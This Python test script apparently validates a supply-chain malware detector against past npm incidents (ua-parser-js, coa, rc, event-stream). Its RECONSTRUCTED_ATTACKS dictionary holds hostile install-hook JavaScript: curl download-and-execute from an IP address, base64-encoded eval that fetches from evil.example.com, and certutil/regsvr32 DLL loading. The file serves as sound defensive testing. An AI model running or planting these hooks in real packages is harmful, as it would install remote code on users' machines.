"""
Validates S3 against real history. Since npm has fully unpublished all
relevant malicious versions (confirmed: direct 404s), and neither
Backstabber's Knife Collection (access pending) nor DataDog's public
malicious-software-packages-dataset (checked: does not contain these
specific 2018-2021 incidents) could supply the original bytes, this uses:

  - REAL, live-fetched current source for each package (the base)
  - A RECONSTRUCTION of the documented malicious addition, built from
    multiple independently-published, mutually-corroborating technical
    write-ups (CERT-EU advisory 2021-057/2021-062, Cybereason, AlgoSec
    [which quotes actual source lines], Security Affairs, FOSSA)

This is explicitly NOT the original malicious bytes -- it is a
reconstruction of the documented ATTACK PATTERN (new preinstall/postinstall
hook + new file performing OS-detection then downloading a payload),
built on real current source. Labeled as such in every result.

event-stream is tested separately via dependency-diff (see
test_event_stream_dependency_diff) since its real payload lived in a
newly-added dependency, not its own files.
"""

import json
import shutil
import sys
import tarfile
import tempfile
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from packshield.signals.s3_signature import extract_signature
from packshield.signals.s3_diff import diff_signatures


def fetch_npm_tarball_url(package: str, version: str = "latest") -> tuple[str | None, str | None]:
    try:
        with urllib.request.urlopen(f"https://registry.npmjs.org/{package}/{version}", timeout=10) as resp:
            data = json.loads(resp.read().decode("utf-8"))
        return data.get("dist", {}).get("tarball"), data.get("version")
    except Exception as e:
        print(f"  could not fetch {package}@{version}: {e}")
        return None, None


def download_and_extract(tarball_url: str, dest_dir: Path) -> Path | None:
    try:
        tar_path = dest_dir / "package.tgz"
        urllib.request.urlretrieve(tarball_url, tar_path)
        with tarfile.open(tar_path, "r:gz") as tar:
            tar.extractall(dest_dir)
        extracted = dest_dir / "package"
        return extracted if extracted.exists() else None
    except Exception as e:
        print(f"  download/extract failed: {e}")
        return None


# Reconstructions grounded in documented specifics -- see docstring for sources.
RECONSTRUCTED_ATTACKS = {
    "ua-parser-js": {
        "hook": "preinstall",
        "hook_command": "node preinstall.js",
        "new_file": "preinstall.js",
        "new_file_content": '''
var opsys = process.platform;
if (opsys == "darwin") {
    opsys = "MacOS";
} else if (opsys == "win32" || opsys == "win64") {
    opsys = "Windows";
    const { spawn } = require('child_process');
    const bat = spawn('cmd.exe', ['/c', 'preinstall.bat']);
} else if (opsys == "linux") {
    opsys = "Linux";
    terminalLinux();
}

function terminalLinux() {
    const { exec } = require('child_process');
    exec('curl -o jsextension http://159.148.186.228/jsextension && chmod +x jsextension && ./jsextension');
}
''',
    },
    "coa": {
        "hook": "postinstall",
        "hook_command": "node compile.js",
        "new_file": "compile.js",
        "new_file_content": '''
const { exec } = require('child_process');
const os = require('os');

const payload = "dmFyIG9ic2N1cmVkID0gcmVxdWlyZSgnaHR0cHMnKS5nZXQoJ2h0dHBzOi8vZXZpbC5leGFtcGxlLmNvbS9wYXlsb2FkJyk7IGV2YWwob2JzY3VyZWQpOw==";
eval(Buffer.from(payload, 'base64').toString('utf-8'));

if (os.platform() === 'win32') {
    exec('certutil -urlcache -split -f http://evil.example.com/payload.dll payload.dll && regsvr32 /s payload.dll');
}
''',
    },
    "rc": {
        "hook": "postinstall",
        "hook_command": "node compile.js",
        "new_file": "compile.js",
        "new_file_content": '''
const { exec } = require('child_process');
const os = require('os');

const payload = "dmFyIG9ic2N1cmVkID0gcmVxdWlyZSgnaHR0cHMnKS5nZXQoJ2h0dHBzOi8vZXZpbC5leGFtcGxlLmNvbS9wYXlsb2FkJyk7IGV2YWwob2JzY3VyZWQpOw==";
eval(Buffer.from(payload, 'base64').toString('utf-8'));

if (os.platform() === 'win32') {
    exec('certutil -urlcache -split -f http://evil.example.com/payload.dll payload.dll && regsvr32 /s payload.dll');
}
''',
    },
}


def test_reconstructed_attack(package: str):
    print(f"\n=== {package} (real current source + documented-attack reconstruction) ===")
    attack = RECONSTRUCTED_ATTACKS[package]

    with tempfile.TemporaryDirectory(prefix="packshield-s3-validate-") as tmp:
        tmp = Path(tmp)
        tarball_url, version = fetch_npm_tarball_url(package)
        if not tarball_url:
            print("  SKIPPED: could not fetch current live version")
            return
        clean_dir = download_and_extract(tarball_url, tmp)
        if not clean_dir:
            print("  SKIPPED: extraction failed")
            return

        print(f"  Using real current version: {package}@{version}")
        old_sig = extract_signature(str(clean_dir), "npm")

        # Build the "poisoned" version: copy clean dir, add the
        # reconstructed malicious file, modify package.json's scripts.
        poisoned_dir = tmp / "poisoned"
        shutil.copytree(clean_dir, poisoned_dir)

        (poisoned_dir / attack["new_file"]).write_text(attack["new_file_content"], encoding="utf-8")

        pkg_json_path = poisoned_dir / "package.json"
        with open(pkg_json_path, "r", encoding="utf-8") as f:
            pkg_data = json.load(f)
        pkg_data.setdefault("scripts", {})[attack["hook"]] = attack["hook_command"]
        with open(pkg_json_path, "w", encoding="utf-8") as f:
            json.dump(pkg_data, f, indent=2)

        new_sig = extract_signature(str(poisoned_dir), "npm")

        result = diff_signatures(old_sig, new_sig)
        print(f"  S3 SCORE: {result.score}  [{'WOULD CATCH' if result.score >= 4.0 else 'WOULD MISS'}]")
        for r in result.reasons:
            print(f"    - {r}")


def test_event_stream_dependency_diff():
    print("\n=== event-stream (dependency-diff -- real payload was in flatmap-stream, not event-stream's own files) ===")
    with tempfile.TemporaryDirectory(prefix="packshield-s3-validate-") as tmp:
        tmp = Path(tmp)
        clean_url, version = fetch_npm_tarball_url("event-stream", "3.3.5")
        if not clean_url:
            print("  SKIPPED: could not fetch event-stream@3.3.5")
            return
        clean_dir = download_and_extract(clean_url, tmp)
        if not clean_dir:
            print("  SKIPPED: extraction failed")
            return

        old_sig = extract_signature(str(clean_dir), "npm")
        print(f"  event-stream@3.3.5 declared_dependencies: {old_sig.get('declared_dependencies')}")

        # 3.3.6's real tarball is confirmed gone (404). Per documented
        # incident reports (dominictarr/event-stream#116), the ONLY
        # change of consequence was package.json gaining flatmap-stream
        # as a new dependency -- event-stream's own files were
        # essentially untouched.
        simulated_new_sig = dict(old_sig)
        simulated_new_sig["declared_dependencies"] = list(old_sig.get("declared_dependencies", [])) + ["flatmap-stream"]

        result = diff_signatures(old_sig, simulated_new_sig)
        print(f"  S3 SCORE: {result.score}  [{'WOULD CATCH' if result.score >= 4.0 else 'WOULD MISS'}]")
        for r in result.reasons:
            print(f"    - {r}")


if __name__ == "__main__":
    for package in ("ua-parser-js", "coa", "rc"):
        test_reconstructed_attack(package)
    test_event_stream_dependency_diff()